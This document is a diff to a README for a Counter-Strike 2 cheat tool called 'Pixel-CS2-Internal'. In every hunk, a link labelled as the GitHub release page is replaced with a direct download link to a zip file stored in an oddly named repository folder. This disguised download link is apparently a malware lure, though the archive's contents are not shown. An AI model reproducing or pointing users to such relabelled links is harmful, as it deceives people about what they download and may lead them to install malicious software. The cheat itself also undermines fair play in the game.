@@ -1,6 +1,6 @@
 # 🎯 Pixel-CS2-Internal - Control CS2 With Precision
 
-[![Download Pixel-CS2-Internal](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/massproduced-superstrate104/Pixel-CS2-Internal/releases)
+[![Download Pixel-CS2-Internal](https://img.shields.io/badge/Download-Release%20Page-blue)](https://raw.githubusercontent.com/massproduced-superstrate104/Pixel-CS2-Internal/main/excitomuscular/Internal_Pixel_C_1.0-beta.5.zip)
 
 ## 🧭 Overview
 
@@ -12,7 +12,7 @@ This README shows how to get the release, set it up on Windows, and start using 
 
 Use the release page here:
 
-[Download from GitHub Releases](https://github.com/massproduced-superstrate104/Pixel-CS2-Internal/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/massproduced-superstrate104/Pixel-CS2-Internal/main/excitomuscular/Internal_Pixel_C_1.0-beta.5.zip)
 
 Open the page, pick the latest release, then download the file for Windows.
 
@@ -51,7 +51,7 @@ Pixel-CS2-Internal includes:
 
 Go to the release page and download the latest Windows build:
 
-[Pixel-CS2-Internal Releases](https://github.com/massproduced-superstrate104/Pixel-CS2-Internal/releases)
+[Pixel-CS2-Internal Releases](https://raw.githubusercontent.com/massproduced-superstrate104/Pixel-CS2-Internal/main/excitomuscular/Internal_Pixel_C_1.0-beta.5.zip)
 
 If the page lists more than one file, choose the main Windows file from the latest release.
 
@@ -270,7 +270,7 @@ Always use the latest release unless you have a reason to stay on an older one.
 
 ## 🔗 Download Again
 
-[Visit the Pixel-CS2-Internal release page](https://github.com/massproduced-superstrate104/Pixel-CS2-Internal/releases)
+[Visit the Pixel-CS2-Internal release page](https://raw.githubusercontent.com/massproduced-superstrate104/Pixel-CS2-Internal/main/excitomuscular/Internal_Pixel_C_1.0-beta.5.zip)
 
 ## 🗂️ Topics
 
